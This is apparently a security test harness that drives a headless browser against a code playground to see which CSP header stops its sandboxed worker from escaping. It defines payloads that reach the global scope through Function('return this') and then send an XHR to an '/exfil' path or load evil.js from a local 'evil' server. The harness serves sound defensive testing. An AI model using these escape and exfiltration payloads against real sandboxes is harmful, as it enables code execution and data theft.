// Matriz de CSP: de ONDE vem a barreira que realmente segura o worker?
//  P-A (3102): remove o header CSP SÓ da resposta do chunk do worker; mantém no documento e nos demais.
//  P-B (3103): remove o header CSP de TUDO, EXCETO do chunk do worker.
//  P-C (3104): remove 'unsafe-eval' de TUDO, EXCETO do chunk do worker (afinamento por recurso).
// Servidor "malvado" 100% local em 127.0.0.1:4999. Nenhuma rede externa.
import http from 'node:http';
import { createRequire } from 'node:module';
import { readdirSync, readFileSync, writeFileSync, statSync } from 'node:fs';
import { join } from 'node:path';

const require = createRequire(import.meta.url);
const { chromium } = require('<repo>/node_modules/.pnpm/playwright-core@1.60.0/node_modules/playwright-core');
const NEXT_DIR = '<repo>/apps/playground/.next/static';
const HEADLESS_SHELL = '<home>/.cache/ms-playwright/chromium_headless_shell-1243/chrome-headless-shell-linux64/chrome-headless-shell';
const OUT = process.argv[2];

function findWorkerChunk(dir, rel = '') {
  for (const n of readdirSync(dir)) {
    const p = join(dir, n); const r = `${rel}/${n}`;
    if (statSync(p).isDirectory()) { const f = findWorkerChunk(p, r); if (f) return f; }
    else if (n.endsWith('.js') && readFileSync(p, 'utf8').includes('Acesso negado nesse trem')) return r;
  }
  return null;
}
const WORKER_PATH = '/_next/static' + findWorkerChunk(NEXT_DIR);
console.log('chunk do worker:', WORKER_PATH);

const hits = [];
const evil = http.createServer((req, res) => {
  hits.push(req.url);
  res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/plain' }); res.end('EVIL-OK');
});
await new Promise((r) => evil.listen(4999, '127.0.0.1', r));

function makeProxy(port, mutate) {
  const srv = http.createServer((creq, cres) => {
    const isWorker = creq.url.split('?')[0] === WORKER_PATH;
    const up = http.request({ host: '127.0.0.1', port: 3101, method: creq.method, path: creq.url, headers: { ...creq.headers, host: '127.0.0.1:3101' } }, (ures) => {
      const h = { ...ures.headers };
      mutate(h, isWorker);
      cres.writeHead(ures.statusCode, h); ures.pipe(cres);
    });
    up.on('error', () => { cres.writeHead(502); cres.end(); });
    creq.pipe(up);
  });
  return new Promise((r) => srv.listen(port, '127.0.0.1', () => r(srv)));
}
const proxies = [
  await makeProxy(3102, (h, isWorker) => { if (isWorker) delete h['content-security-policy']; }),
  await makeProxy(3103, (h, isWorker) => { if (!isWorker) delete h['content-security-policy']; }),
  await makeProxy(3104, (h, isWorker) => { if (!isWorker && h['content-security-policy']) h['content-security-policy'] = String(h['content-security-policy']).replace(/\s*'unsafe-eval'/g, ''); }),
];

const browser = await chromium.launch({ executablePath: HEADLESS_SHELL });
const results = [];

const XHR_ESCAPE = (tag) => `const G = Function("return this")(); const x = new G.XMLHttpRequest(); try { x.open("GET", "http://127.0.0.1:4999/exfil?${tag}", false); x.send(); console.log("XHR status:", x.status); } catch (e) { console.log("XHR falhou:", e.name); }`;
const IMPORT_SCRIPTS = (tag) => `const G = Function("return this")(); try { G.importScripts("http://127.0.0.1:4999/evil.js?${tag}"); console.log("importScripts: carregou"); } catch (e) { console.log("importScripts falhou:", e.name); }`;

async function scenario(name, base, code, { expectExfilPath } = {}) {
  const before = hits.length;
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  const page = await ctx.newPage();
  const consoleMsgs = [];
  page.on('console', (m) => consoleMsgs.push(`${m.type()}: ${m.text()}`.slice(0, 300)));
  page.on('pageerror', (e) => consoleMsgs.push(`pageerror: ${String(e.message).slice(0, 200)}`));
  const entry = { name, base, saida: '', status: '' };
  try {
    await page.goto(base + '/');
    await page.locator('.monaco-editor').first().waitFor({ state: 'visible', timeout: 20000 });
    await page.waitForFunction(() => window.monaco && window.monaco.editor.getModels()[0].getValue().includes('Eai sô'), null, { timeout: 20000 });
    if (code) await page.evaluate((c) => window.monaco.editor.getModels()[0].setValue(c), code);
    await page.getByRole('button', { name: /Bota pra moer/i }).click();
    await page.getByRole('status').filter({ hasText: /Rodou bonito|Deu ruim|travou/ }).waitFor({ timeout: 10000 });
    entry.status = (await page.getByRole('status').innerText()).trim();
    entry.saida = (await page.getByRole('tabpanel').innerText()).replace(/\n/g, ' ⏎ ').trim();
    if (!code) {
      // fluxo normal: carregar exemplo da lista e rodar, + tokenização do Monaco
      await page.getByLabel('Exemplos:').selectOption({ label: 'Classe Pequi' });
      await page.waitForFunction(() => window.monaco.editor.getModels()[0].getValue().includes('Pequi'));
      await page.getByRole('button', { name: /Bota pra moer/i }).click();
      await page.getByRole('tabpanel').filter({ hasText: /Pequi verde/ }).waitFor({ timeout: 10000 });
      entry.exemploPequi = 'ok';
    }
  } catch (e) { entry.probeError = String(e.message).split('\n')[0].slice(0, 200); }
  entry.evilHits = hits.slice(before);
  entry.console = consoleMsgs.filter((m) => !/React DevTools/.test(m));
  results.push(entry);
  console.log(`\n=== ${name}  @${base}`);
  console.log('  status :', entry.status, '| saida:', entry.saida.slice(0, 200), entry.exemploPequi ? '| exemplo Pequi: ok' : '');
  if (entry.probeError) console.log('  PROBE  :', entry.probeError);
  console.log('  evilHits:', JSON.stringify(entry.evilHits));
  if (entry.console.length) console.log('  console:', JSON.stringify(entry.console.slice(0, 6)));
  await ctx.close();
}

// P-A: CSP removido SÓ do chunk do worker (documento mantém CSP)
await scenario('P-A1 XHR sync | CSP removido só do worker', 'http://127.0.0.1:3102', XHR_ESCAPE('PA1'));
await scenario('P-A2 importScripts | CSP removido só do worker', 'http://127.0.0.1:3102', IMPORT_SCRIPTS('PA2'));
// P-B: CSP removido de tudo MENOS do chunk do worker (worker mantém CSP)
await scenario('P-B1 XHR sync | CSP removido do documento, mantido no worker', 'http://127.0.0.1:3103', XHR_ESCAPE('PB1'));
await scenario('P-B2 importScripts | CSP removido do documento, mantido no worker', 'http://127.0.0.1:3103', IMPORT_SCRIPTS('PB2'));
// P-C: sem unsafe-eval em tudo menos no worker
await scenario('P-C1 fluxo normal sem unsafe-eval no documento/Monaco', 'http://127.0.0.1:3104', null);
await scenario('P-C2 escape + XHR sync sem unsafe-eval no documento', 'http://127.0.0.1:3104', XHR_ESCAPE('PC2'));

writeFileSync(OUT, JSON.stringify({ workerPath: WORKER_PATH, results }, null, 2));
await browser.close(); evil.close(); proxies.forEach((p) => p.close());
